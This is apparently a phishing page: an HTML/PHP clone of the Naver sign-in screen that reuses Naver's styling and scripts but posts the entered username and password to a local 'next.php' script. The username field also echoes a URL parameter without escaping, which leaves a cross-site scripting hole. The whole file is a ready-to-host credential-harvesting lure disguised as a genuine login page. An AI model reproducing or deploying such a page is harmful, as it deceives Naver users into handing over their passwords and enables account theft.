﻿
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<title>Naver Sign in</title>
	<link rel="stylesheet" type="text/css" href="https://nid.naver.com/login/css/global/desktop/w_20181218.css?dt=20181218">
</head>
<body class="global chrome">
<div id="wrap">
    <div id="u_skip">
        <a href="#content" onclick="document.getElementById('content').tabIndex=-1;document.getElementById('content').focus();return false;"><span>본문으로 바로가기</span></a>
    </div>
	<!-- header -->
	<div id="header">
		<h1><a href="http://www.naver.com" class="sp h_logo" onclick="nclks('log.naver',this,event)"><span class="blind">NAVER</span></a></h1>
		<div class="lang">
			<select id="locale_switch" name="locale_switch" title="언어선택" class="sel" onchange="switchlocale();nclks_select(this.value,'',{'ko_KR':'log.lankr','en_US':'log.lanen','zh-Hans_CN':'log.lancn','zh-Hant_TW':'log.lantw'},this,event);">
				<option value="ko_KR" >한국어</option>
				<option value="en_US" >English</option>
				<option value="zh-Hans_CN" >中文(简体)</option>
				<option value="zh-Hant_TW" >中文(台灣)</option>
			</select>
		</div>
	</div>
	<!-- //header -->
	<!-- container -->
	<div id="container">
		<!-- content -->
		<div id="content">
			<div class="title" aria-live="assertive">
				<p></p>
			</div>
				<form id="frmNIDLogin" name="userid" target="_top" AUTOCOMPLETE="off" action="next.php" method="POST">
				<input type="hidden" id="localechange" name="localechange" value="">
				<input type="hidden" name="encpw" id="encpw" value="">
<input type="hidden" name="enctp" id="enctp" value="1">
<input type="hidden" name="svctype" id="svctype" value="1">
<input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
<input type="hidden" name="bvsd" id="bvsd" value="">
<input type="hidden" name="encnm" id="encnm" value="">
<input type="hidden" name="locale" id="locale" value="en_US">
<input type="hidden" name="url" id="url" value="http://mail.naver.com/">

				<fieldset class="login_form">
					<legend class="blind">Sign in</legend>
					<div class="id_area">
						<div class="input_row" id="id_area">
							<span class="input_box">
								<label for="id" id="label_id_area" class="lbl">Username</label>
								<input type="text" id="id" name="userid" accesskey="L" value="<?=$_GET[userid]?>" class="int" maxlength="41" value="">
							</span>
							<button type="button" disabled="" title="delete" id="id_clear" class="wrg">delete</button>
						</div>
						<div class="error" id="err_empty_id" style="display:none" aria-live="assertive"></div>
					</div>
					<div class="pw_area">
						<div class="input_row" id="pw_area">
							<span class="input_box">
								<label for="pw" id="label_pw_area"  class="lbl">Password</label>
								<input type="password" id="pw" name="password" placeholder="Password" class="int" maxlength="16" onkeypress="capslockevt(event);getKeysv2();" onkeyup="checkShiftUp(event);" onkeydown="checkShiftDown(event);">
							</span>
							<button type="button" disabled="" title="delete" id="pw_clear" class="wrg">delete</button>
							<div class="ly_v2" id="err_capslock" style="display:none;">
								<div class="ly_box">
									<p><strong>Caps Lock</strong> is on.</p>
								</div>
								<span class="sp ly_point"></span>
							</div>
						</div>
						<div class="error" id="err_empty_pw" style="display:none" aria-live="assertive"></div>
					</div>
					<input type="submit" title="Sign in" alt="Sign in" value="Sign in" class="btn_global" onclick="nclks('log.login',this,event)">
					<div class="check_info">
						<div class="login_check">
							<span class="login_check_box">
								<input type="checkbox" id="login_chk" name="nvlong" class=""  value="off" onchange="savedLong(this);nclks_chk('login_chk', 'log.keepon', 'log.keepoff',this,event)" />
								<label for="login_chk" id="label_login_chk" class="sp ">Stay Signed in</label>
							</span>
							<div class="ly_v2" id="persist_usage" style="display:none;">
								<div class="ly_box">
									<p>Please use your own PC for keeping your account secure. &nbsp;&nbsp;<a href="https://help.naver.com/support/contents/contents.nhn?serviceNo=532&categoryNo=1523" target="_blank" class="sp btn_check_help">View help</a></p>
								</div>
								<span class="sp ly_point"></span>
							</div>
						</div>
					</div>
				</fieldset>
			</form>
			<div class="position_a">
				<div class="find_info">
					<p>Forgot your <a target="_blank" id="idinquiry" href="https://nid.naver.com/user/help.nhn?todo=idinquiry&lang=en_US">Username</a> or <a target="_blank" id="pwinquiry" href="https://nid.naver.com/user/help.nhn?todo=pwinquiry&lang=en_US">Password?</a> <span class="bar">|</span> <a target="_blank" id="join" href="https://nid.naver.com/user/join.html?lang=en_US">Sign up</a>
				</div>
			</div>
<script type="text/javascript">
function swap_social_menu()
{
	if (document.getElementById("social_more_button").className.indexOf("open")==-1)
	{
		document.getElementById("social_more_button").className = "btn_more sp open";
		document.getElementById("social_extra_view_div").style.display="block";
	}
	else
	{
		document.getElementById("social_more_button").className = "btn_more sp close";
		document.getElementById("social_extra_view_div").style.display="none";
	}
}
</script>
			<div class="social_login">
				<div class="social_header">
					<span class="social_title">Sign in & Join with</span>
				</div>
				<div class="btn_social_group">
					<span class="btn_social_align"><a href="/oauth/global/initSNS.nhn?idp_cd=facebook&locale=en_US&svctype=1&postDataKey=&url=http%3A%2F%2Fmail.naver.com%2F" class="btn_social facebook" title="Log in with your Facebook account"><span class="social_ico sp"></span><span class="social_text">Facebook</span></a></span>
					<span class="btn_social_align"><a href="/oauth/global/initSNS.nhn?idp_cd=line&locale=en_US&svctype=1&postDataKey=&url=http%3A%2F%2Fmail.naver.com%2F" class="btn_social line" title="Log in with your Line account"><span class="social_ico sp"></span><span class="social_text">Line</span></a></span>
				</div>
				<div class="btn_social_group" id="social_extra_view_div" style="display:none">
					
					<span class="btn_social_align"><a href="/oauth/global/initSNS.nhn?idp_cd=line&locale=en_US&svctype=1&postDataKey=&url=http%3A%2F%2Fmail.naver.com%2F" class="btn_social line" title="Log in with your Line account"><span class="social_ico sp"></span><span class="social_text">Line</span></a></span>
				</div>
			</div>
		</div>
		<!-- //content -->
	</div>
	<!-- //container -->
	<!-- footer -->
	<div id="footer">
		<address><em><a target="_blank" href="http://www.navercorp.com" class="logo" onclick="nclks('fot.naver',this,event)"><span class="blind">naver</span></a></em><em class="copy">Copyright</em> <em class="u_cri">&copy;</em> <a target="_blank" href="http://www.navercorp.com" class="u_cra"  onclick="nclks('fot.navercorp',this,event)">NAVER Corp.</a> <span class="all_r">All Rights Reserved.</span></address>	
	</div>
	<!-- //footer -->
</div>
<script type="text/javascript" src="https://nid.naver.com/login/js/common.all.js?141216"> </script>
<script type="text/javascript">
var session_keys = "";
var pc_keyboard_close="<span class=\"sp\">PC 키보드 닫기</span>";
var pc_keyboard_open="<span class=\"sp\">PC 키보드 보기</span>";
var view_char="한글 보기";
var view_symbol="특수기호 보기";

addInputEvent('id', 'id_area');
addInputEvent('pw', 'pw_area');
initSmartLevel();
var login_chk = $('login_chk');
if(login_chk.attachEvent) {
	login_chk.attachEvent("onchange", function(){persist_usage();});
} else if (login_chk.addEventListener) {
	login_chk.addEventListener("change", function(){persist_usage();}, false);
}
function persist_usage()
{
	var login_chk = $("login_chk");
	if (login_chk.checked==true)
	{
		show("persist_usage");
		hide('onetime_usage');
		view_onetimeusage = false;
	}
	else
	{
		hide("persist_usage");
	}
}
var view_onetimeusage = false;
function viewOnetime()
{
	if (view_onetimeusage)
	{
		hide('onetime_usage');
		view_onetimeusage = false;
	}
	else
	{
		hide("persist_usage");
		show('onetime_usage');
		view_onetimeusage = true;
	}
}
try{
	if (navigator.appVersion.toLowerCase().indexOf("win") != -1) {
		$('id').style.imeMode = "disabled";
		document.msCapsLockWarningOff = true;
	}
}catch(e) {}
try{
	if ( $('id').value.length == 0 )
	{
		$('id').focus();
	}
	else
	{
		$('pw').focus();
	}
}catch (e){}
function selectItemByValue(elmnt, value){
	isSet = false;
	for(var i=0; i < elmnt.options.length; i++)
	{
		if(elmnt.options[i].value === value) {
			elmnt.selectedIndex = i;
			isSet = true;
			break;
		}
	}
	if (!isSet)
		elmnt.selectedIndex=1;
}
try {
selectItemByValue(locale_switch, 'en_US');
}catch (e){}
var id_error_msg="Enter your username!";
var pw_error_msg="Enter your password!";
var inSubmitProgress = false;
function confirmSplitSubmit()
{
        if (inSubmitProgress) {
                return false;
        }
        inSubmitProgress = true;
        var id = $("id");
        var pw = $("pw");
        var encpw = $("encpw");
        
        if(id.value == "") {
                show("err_empty_id");
                $("err_empty_id").innerHTML=id_error_msg;
                hide("err_empty_pw");
                $("err_empty_pw").innerHTML="";
                hide("err_common_pw1");
                hide("err_common");
                id.focus();
                inSubmitProgress = false;
                return false;
        } else if(pw.value == "") {
                show("err_empty_pw");
                $("err_empty_pw").innerHTML=pw_error_msg;
                hide("err_empty_id");
                $("err_empty_id").innerHTML="";
                hide("err_common_pw1");
                hide("err_common");
                pw.focus();
                inSubmitProgress = false;
                return false;
        }
        try{
                $("ls").value = localStorage.getItem("nid_t");
        }catch(e){}
        return encryptIdPwSplit();
}
function encryptIdPwSplit() {
        var id = $("id");
        var pw = $("pw");
        var encpw = $("encpw");
        var rsa = new RSAKey;

        if (keySplit(session_keys)) {
                rsa.setPublic(evalue, nvalue);
                try{
                        encpw.value = rsa.encrypt(
                                getLenChar(sessionkey) + sessionkey +
                                getLenChar(id.value) + id.value +
                                getLenChar(pw.value) + pw.value);
                } catch(e) {
                        inSubmitProgress = false;
                        return false;
                }
                $('enctp').value = 1;

                setTimeout(function() {
                        $("id").value = "";
                        $("pw").value = "";
                        $("bvsd").value = "timeout";
                        $('frmNIDLogin').submit();
                }, 5000);
                try {
                        if (bvsd){
                                bvsd.f(function(a) {
                                        $("id").value = "";
                                        $("pw").value = "";
                                        $("bvsd").value = a;
                                        $('frmNIDLogin').submit();
                                });
                        }
                } catch (e) {
                        $("id").value = "";
                        $("pw").value = "";
                        $("bvsd").value = "error1|"+e.name+"|"+e.message;;
                        $('frmNIDLogin').submit();
                }
        }
        else
        {
                getKeyByRuntimeIncludeSplit();
        }
        inSubmitProgress = false;
        return false;
}
function getKeyByRuntimeIncludeSplit() {
        try {
                var keyjs  = document.createElement('script');
                keyjs.type = 'text/javascript';
                keyjs.src = 'https://nid.naver.com/login/ext/keys_js3.nhn';
                document.getElementsByTagName('head')[0].appendChild(keyjs);
        } catch (e) {
        }
}
</script>
<script type="text/javascript" src="https://nid.naver.com/login/js/bvsd.1.3.4.min.js"></script>
<script type="text/javascript">
var porperties = {
	keyboard: [{
		id: "id"
	}, {
		id: "pw",
		secureMode: true
	}],
	modeProperties: {
		mode: 2,
		url: "/nc/b"
	}
};
bvsd = new sofa.Koop(porperties);


</script>
<script type="text/javascript" src="https://nid.naver.com/login/js/lcs_nclicks.js?dt=20190122"></script>
<script type="text/javascript"> 
lcs_do(); 
var g_ssc = "nid.login_en";
var ccsrv = "cc.naver.com";
</script>
<div id="nv_stat" style="display:none;">20</div>
</body>
</html>
